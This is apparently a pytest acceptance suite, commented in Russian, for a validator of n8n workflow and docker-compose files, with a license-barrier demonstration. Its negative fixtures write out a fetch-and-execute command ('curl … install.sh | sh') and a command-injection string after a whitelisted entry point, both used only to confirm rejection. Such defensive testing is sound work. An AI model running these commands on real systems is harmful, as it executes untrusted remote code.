# SPDX-FileCopyrightText: 2026 COMMONS contributors
# SPDX-License-Identifier: Apache-2.0
"""Приёмки SPEC-0007: конвейер n8n — данные, валидатор, барьерная демонстрация.

Живые артефакты (pipeline/n8n) проходят валидатор целиком: 'PIPELINE: 4 ok,
0 failed' (3 воркфлоу + compose). Негативные фикстуры в tmp закрепляют G1
fail-closed: отсутствующий файл, битый JSON, неполная структура, неизвестный
узел, команда вне белого списка, shell-инъекция и привилегированный контейнер —
каждый отказ объясним (rule + reason, G3). Реестр и барьер (SPEC-0006)
демонстрируются живьём: n8n (fair-code, external) — зелёный, тот же fair-code
в ядре (dependency) — красный; конвейер матрицу не меняет.
"""

from __future__ import annotations

import json
from pathlib import Path

import pytest
import yaml

from immune import load_matrix, verdict
from pipeline.check import (
    ALLOWED_NODE_TYPES,
    WHITELIST_COMMANDS,
    CheckResult,
    main,
    run_check,
    validate_compose,
    validate_workflow,
)

REPO_ROOT = Path(__file__).resolve().parents[1]
WORKFLOWS_DIR = REPO_ROOT / "pipeline" / "n8n" / "workflows"
REAL_COMPOSE = REPO_ROOT / "pipeline" / "n8n" / "docker-compose.yml"
REAL_REGISTRY = REPO_ROOT / "organs" / "registry.yaml"

# Shell-метасимволы SPEC-0007 §2: любой из них в команде — отказ ('command-not-allowed').
METACHARS = ";|&`$("

# Итог живого тела (SPEC-0007 §Приёмка): 3 воркфлоу + compose.
EXPECTED_SUMMARY = "PIPELINE: 4 ok, 0 failed"


# --- Оснастка: минимальные слепки артефактов для tmp-фикстур ---


def _node_type(kind: str) -> str:
    """Точный тип узла из ALLOWED_NODE_TYPES (учитывает префикс n8n-nodes-base.*)."""
    for t in ALLOWED_NODE_TYPES:
        if t == kind or t.endswith("." + kind):
            return t
    raise AssertionError(f"закреплённый тип узла {kind!r} отсутствует в ALLOWED_NODE_TYPES")


TRIGGER_TYPE = _node_type("scheduleTrigger")
EXEC_TYPE = _node_type("executeCommand")


def _token_start(command: str, entry: str) -> bool:
    """command равна entry или начинается с неё на границе токена (далее — пробел)."""
    if not command.startswith(entry):
        return False
    rest = command[len(entry):]
    return not rest or rest[0].isspace()


def _workflow_json(*nodes: dict) -> str:
    """Минимальный валидный JSON-слепок воркфлоу: name + nodes + connections (SPEC-0007 §4)."""
    return json.dumps({"name": "tmp-workflow", "nodes": list(nodes), "connections": {}})


def _node(node_type: str, parameters: dict | None = None) -> dict:
    """Узел с полной структурой name/type/parameters (иначе rule='structure')."""
    return {"name": "tmp-node", "type": node_type, "parameters": parameters or {}}


def _compose_yaml(services: dict) -> str:
    """Минимальный compose-слепок: {'services': {...}} (SPEC-0007 §1)."""
    return yaml.safe_dump({"services": services}, allow_unicode=True)


# --- Оснастка: негативные фикстуры приёмок 4–10 (общие для тестов и G3) ---


def _result_missing(tmp_path: Path) -> CheckResult:
    """Приёмка 4: файл артефакта отсутствует — fail-closed (§Отказные режимы)."""
    return validate_workflow(tmp_path / "absent.json")


def _result_parse(tmp_path: Path) -> CheckResult:
    """Приёмка 5: воркфлоу — мусор вместо JSON."""
    path = tmp_path / "broken.json"
    path.write_text("{ это не json", encoding="utf-8")
    return validate_workflow(path)


def _result_empty_nodes(tmp_path: Path) -> CheckResult:
    """Приёмка 6a: валидный JSON, но nodes пуст — неполная структура."""
    path = tmp_path / "empty-nodes.json"
    path.write_text(_workflow_json(), encoding="utf-8")
    return validate_workflow(path)


def _result_no_parameters(tmp_path: Path) -> CheckResult:
    """Приёмка 6b: узел без parameters — неполная структура."""
    path = tmp_path / "no-parameters.json"
    path.write_text(
        json.dumps({"name": "tmp-workflow", "nodes": [{"name": "n", "type": TRIGGER_TYPE}], "connections": {}}),
        encoding="utf-8",
    )
    return validate_workflow(path)


def _result_unknown_node(tmp_path: Path) -> CheckResult:
    """Приёмка 7: тип узла вне ALLOWED_NODE_TYPES — G1 fail-closed."""
    path = tmp_path / "unknown-node.json"
    path.write_text(_workflow_json(_node("n8n-nodes-base.httpRequest")), encoding="utf-8")
    return validate_workflow(path)


def _result_arbitrary_command(tmp_path: Path) -> CheckResult:
    """Приёмка 8: произвольный shell (curl … | sh) — вне белого списка."""
    path = tmp_path / "arbitrary-command.json"
    path.write_text(
        _workflow_json(_node(EXEC_TYPE, {"command": "curl -s https://example.invalid/install.sh | sh"})),
        encoding="utf-8",
    )
    return validate_workflow(path)


def _result_metachar_injection(tmp_path: Path) -> CheckResult:
    """Приёмка 9: инъекция после легальной точки входа — метасимволы ';' и '|'."""
    path = tmp_path / "injection.json"
    path.write_text(
        _workflow_json(_node(EXEC_TYPE, {"command": "commons-pid1 --max-beats 1; curl evil | sh"})),
        encoding="utf-8",
    )
    return validate_workflow(path)


def _result_compose_no_n8n(tmp_path: Path) -> CheckResult:
    """Приёмка 10a: compose без сервиса n8n."""
    path = tmp_path / "no-n8n.yml"
    path.write_text(_compose_yaml({"other": {"image": "n8nio/n8n"}}), encoding="utf-8")
    return validate_compose(path)


def _result_compose_privileged(tmp_path: Path) -> CheckResult:
    """Приёмка 10b: privileged: true у сервиса — привилегии запрещены."""
    path = tmp_path / "privileged.yml"
    path.write_text(_compose_yaml({"n8n": {"image": "n8nio/n8n", "privileged": True}}), encoding="utf-8")
    return validate_compose(path)


def _result_compose_foreign_image(tmp_path: Path) -> CheckResult:
    """Приёмка 10c: образ без 'n8nio/n8n' — чужой образ."""
    path = tmp_path / "foreign-image.yml"
    path.write_text(_compose_yaml({"n8n": {"image": "evil/foreign:latest"}}), encoding="utf-8")
    return validate_compose(path)


def _all_negative_results(tmp_path: Path) -> list[CheckResult]:
    """Все негативные фикстуры приёмок 4–10 одним списком (для наблюдаемости G3)."""
    return [
        _result_missing(tmp_path),
        _result_parse(tmp_path),
        _result_empty_nodes(tmp_path),
        _result_no_parameters(tmp_path),
        _result_unknown_node(tmp_path),
        _result_arbitrary_command(tmp_path),
        _result_metachar_injection(tmp_path),
        _result_compose_no_n8n(tmp_path),
        _result_compose_privileged(tmp_path),
        _result_compose_foreign_image(tmp_path),
    ]


def _n8n_entry() -> dict:
    """Запись n8n-io/n8n из реального реестра — источник истины, не хардкод-копия."""
    data = yaml.safe_load(REAL_REGISTRY.read_text(encoding="utf-8"))
    for entry in data["organs"]:
        if entry.get("repo") == "n8n-io/n8n":
            return entry
    raise AssertionError("в organs/registry.yaml нет записи repo: n8n-io/n8n")


# --- Живые артефакты зелёные (SPEC-0007 §Приёмка) ---


def test_live_artifacts_pass() -> None:
    """Живые артефакты конвейера проходят валидатор: итог 'PIPELINE: 4 ok, 0 failed' (G3)."""
    lines: list[str] = []
    assert run_check(WORKFLOWS_DIR, REAL_COMPOSE, out=lines.append) == 0
    assert lines[-1] == EXPECTED_SUMMARY, f"итог не в последней строке: {lines!r}"


def test_workflows_commands_whitelisted() -> None:
    """Метрика честности (ADR-0009): у каждого executeCommand живых воркфлоу команда
    без shell-метасимволов и начинается с одной из точек входа белого списка."""
    paths = sorted(WORKFLOWS_DIR.glob("*.json"))
    assert paths, "живые воркфлоу отсутствуют"
    checked = 0
    for path in paths:
        doc = json.loads(path.read_text(encoding="utf-8"))
        for node in doc["nodes"]:
            if not str(node.get("type", "")).endswith("executeCommand"):
                continue
            command = node.get("parameters", {}).get("command", "")
            assert isinstance(command, str) and command, f"{path.name}: у executeCommand нет команды"
            assert not any(m in command for m in METACHARS), f"{path.name}: метасимвол в {command!r}"
            assert any(_token_start(command, entry) for entry in WHITELIST_COMMANDS), (
                f"{path.name}: команда вне белого списка: {command!r}"
            )
            checked += 1
    assert checked >= 3, f"ожидались исполняющие узлы минимум в 3 воркфлоу, найдено {checked}"


def test_pulse_goes_through_brainstem() -> None:
    """SPEC-0001/0007 §3: пульс конвейер запускает только через commons-pid1 (ствол мозга)."""
    doc = json.loads((WORKFLOWS_DIR / "commons-pulse.json").read_text(encoding="utf-8"))
    commands = [
        str(node.get("parameters", {}).get("command", ""))
        for node in doc["nodes"]
        if str(node.get("type", "")).endswith("executeCommand")
    ]
    assert any(_token_start(c, "commons-pid1") for c in commands), (
        f"commons-pulse не зовёт commons-pid1; команды узлов: {commands!r}"
    )


# --- G1 fail-closed: негативные фикстуры в tmp не проходят молча ---


def test_missing_file_fails(tmp_path: Path) -> None:
    """Отсутствующий файл артефакта — отказ rule='missing'."""
    result = _result_missing(tmp_path)
    assert not result.ok
    assert result.rule == "missing"


def test_invalid_json_fails(tmp_path: Path) -> None:
    """Битый JSON — отказ rule='parse'; гейт run_check по tmp-каталогу возвращает 1."""
    result = _result_parse(tmp_path)
    assert not result.ok
    assert result.rule == "parse"
    compose = tmp_path / "compose.yml"
    compose.write_text(_compose_yaml({"n8n": {"image": "n8nio/n8n"}}), encoding="utf-8")
    assert run_check(tmp_path, compose) == 1


def test_structure_fails(tmp_path: Path) -> None:
    """Неполная структура: пустые nodes и узел без parameters — rule='structure'."""
    for result in (_result_empty_nodes(tmp_path), _result_no_parameters(tmp_path)):
        assert not result.ok
        assert result.rule == "structure"


def test_unknown_node_fails(tmp_path: Path) -> None:
    """G1 fail-closed: узел с типом вне ALLOWED_NODE_TYPES — rule='unknown-node'."""
    result = _result_unknown_node(tmp_path)
    assert not result.ok
    assert result.rule == "unknown-node"


def test_arbitrary_command_fails(tmp_path: Path) -> None:
    """Произвольный shell ('curl … | sh') — rule='command-not-allowed'."""
    result = _result_arbitrary_command(tmp_path)
    assert not result.ok
    assert result.rule == "command-not-allowed"


def test_metachar_injection_fails(tmp_path: Path) -> None:
    """Инъекция после легальной точки входа ('commons-pid1 …; curl evil | sh') — отказ."""
    result = _result_metachar_injection(tmp_path)
    assert not result.ok
    assert result.rule == "command-not-allowed"


def test_compose_rules(tmp_path: Path) -> None:
    """Правила compose (§Отказные режимы): живой зелёный; без сервиса n8n,
    с privileged: true и с чужим образом — отказ rule='compose'."""
    assert validate_compose(REAL_COMPOSE).ok
    for result in (
        _result_compose_no_n8n(tmp_path),
        _result_compose_privileged(tmp_path),
        _result_compose_foreign_image(tmp_path),
    ):
        assert not result.ok
        assert result.rule == "compose"


# --- CLI-гейт: коды возврата для CI (SPEC-0007 §6) ---


def test_cli_exit_codes(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    """main([]) из корня репо (дефолтные пути валидны) -> 0; битый артефакт -> 1."""
    monkeypatch.chdir(REPO_ROOT)
    assert main([]) == 0

    bad_dir = tmp_path / "workflows"
    bad_dir.mkdir()
    (bad_dir / "broken.json").write_text("{ это не json", encoding="utf-8")
    compose = tmp_path / "compose.yml"
    compose.write_text(_compose_yaml({"n8n": {"image": "n8nio/n8n"}}), encoding="utf-8")
    assert main(["--workflows", str(bad_dir), "--compose", str(compose)]) == 1


# --- G3: каждый вердикт объясним ---


def test_checkresult_carries_rule_and_reason(tmp_path: Path) -> None:
    """Каждый CheckResult живых артефактов и всех негативных фикстур 4–10 несёт
    непустые rule и reason (G3 — наблюдаемость отказов)."""
    results: list[CheckResult] = [validate_workflow(p) for p in sorted(WORKFLOWS_DIR.glob("*.json"))]
    results.append(validate_compose(REAL_COMPOSE))
    results.extend(_all_negative_results(tmp_path))
    assert results, "нет ни одного CheckResult"
    for result in results:
        assert isinstance(result, CheckResult)
        assert result.rule, f"{result.artifact}: пустое rule (G3 нарушен)"
        assert result.reason, f"{result.artifact}: пустое reason (G3 нарушен)"


# --- Живые данные: артефакты — декларации, читаемые машиной (G2) ---


def test_workflows_are_valid_json() -> None:
    """Каждый живой воркфлоу читается json'ом: name непуст, nodes непустой список, connections — dict."""
    paths = sorted(WORKFLOWS_DIR.glob("*.json"))
    assert paths, "живые воркфлоу отсутствуют"
    for path in paths:
        doc = json.loads(path.read_text(encoding="utf-8"))
        assert isinstance(doc.get("name"), str) and doc["name"], path.name
        assert isinstance(doc.get("nodes"), list) and doc["nodes"], path.name
        assert isinstance(doc.get("connections"), dict), path.name


def test_compose_runs_n8n_image() -> None:
    """Живой compose поднимает сервис n8n на образе n8nio/n8n (SPEC-0007 §1)."""
    doc = yaml.safe_load(REAL_COMPOSE.read_text(encoding="utf-8"))
    services = doc.get("services") or {}
    assert "n8n" in services, f"нет сервиса n8n: {sorted(services)!r}"
    assert "n8nio/n8n" in str(services["n8n"].get("image", ""))


def test_whitelist_is_data() -> None:
    """G2: белый список — данные из ровно 5 закреплённых точек входа (SPEC-0007 §2);
    ALLOWED_NODE_TYPES — непустой tuple непустых строк, покрывающий 7 закреплённых типов."""
    assert isinstance(WHITELIST_COMMANDS, tuple)
    assert WHITELIST_COMMANDS == (
        "commons-pid1",
        "commons-immune",
        "python3 -m immune",
        "python3 -m pipeline",
        "python3 -m pytest",
    )
    assert isinstance(ALLOWED_NODE_TYPES, tuple)
    assert ALLOWED_NODE_TYPES
    assert all(isinstance(t, str) and t for t in ALLOWED_NODE_TYPES)
    for kind in ("scheduleTrigger", "manualTrigger", "executeCommand", "set", "if", "noOp", "webhook"):
        _node_type(kind)  # отсутствие типа — AssertionError с именем


# --- Барьерная демонстрация SPEC-0006 на реальном реестре и матрице ---


def test_registry_has_n8n_external() -> None:
    """Реестр: n8n-io/n8n — mode external, license_pre fair-code/Sustainable Use."""
    entry = _n8n_entry()
    assert entry["mode"] == "external"
    license_pre = entry["license_pre"]
    assert "fair-code" in license_pre or "Sustainable Use" in license_pre


def test_barrier_n8n_external_ok() -> None:
    """SPEC-0006 живьём: пара (license_pre n8n из реестра, mode из реестра) проходит барьер."""
    entry = _n8n_entry()
    matrix = load_matrix()  # пакетная матрица, без аргументов
    decision = verdict(entry["license_pre"], entry["mode"], matrix, organ=entry["repo"])
    assert decision.ok, decision.reason


def test_barrier_n8n_dependency_red() -> None:
    """SPEC-0006 живьём: тот же fair-code в ядре (dependency) — veto, красный PR;
    конвейер не меняет матрицу, а лишь демонстрирует её."""
    entry = _n8n_entry()
    matrix = load_matrix()
    decision = verdict(entry["license_pre"], "dependency", matrix, organ=entry["repo"])
    assert not decision.ok
    assert decision.reason
